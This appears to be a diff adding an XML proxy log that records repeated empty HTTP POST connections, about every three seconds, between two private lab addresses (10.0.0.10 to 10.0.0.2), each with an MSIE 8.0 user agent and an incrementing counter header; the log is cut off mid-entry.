+<PCProxy_Activity lptimestamp='2017-10-16T09:43:33'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:33'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49342</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:33'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000033
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000033</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:33'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49342</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>51</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:33'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49342</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:36'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:36'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49343</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:36'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000034
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000034</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:36'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49343</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>52</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:36'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49343</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:39'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:39'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49344</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:39'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000035
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000035</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:39'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49344</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>53</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:39'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49344</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:42'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:42'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49345</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:42'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000036
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000036</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:42'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49345</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>54</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:42'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49345</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:45'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:45'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49346</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:45'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000037
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000037</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:45'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49346</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>55</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:45'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49346</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:48'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:48'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49347</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:48'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000038
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000038</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:48'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49347</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>56</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:48'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49347</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:50'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:50'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49348</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:50'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000039
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000039</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:50'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49348</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>57</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:50'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49348</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:53'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:53'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49349</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:53'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000003a
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000003a</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:53'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49349</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>58</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:53'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49349</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:43:56'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:43:56'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49350</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:43:56'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000003b
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000003b</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:43:56'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49350</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>59</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:43:56'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49350</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:00'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:00'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49351</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:00'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000003c
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000003c</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:00'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49351</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>60</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:00'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49351</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:03'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:03'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49352</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:03'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000003d
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000003d</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:03'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49352</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>61</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:03'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49352</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:06'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:06'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49353</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:06'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000003e
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000003e</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:06'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49353</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>62</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:06'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49353</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:09'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:09'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49354</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:09'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000003f
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000003f</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:09'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49354</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>63</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:09'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49354</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:12'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:12'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49355</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:12'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000040
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000040</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:12'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49355</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>64</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:12'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49355</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:14'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:14'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49356</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:14'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000041
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000041</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:14'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49356</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>65</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:14'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49356</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:17'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:17'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49357</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:17'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000042
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000042</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:17'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49357</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>66</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:17'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49357</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:20'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:20'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49358</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:20'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000043
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000043</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:20'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49358</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>67</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:20'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49358</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:23'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:23'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49359</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:23'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000044
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000044</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:23'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49359</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>68</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:23'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49359</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:26'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:26'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49360</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:26'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000045
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000045</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:26'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49360</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
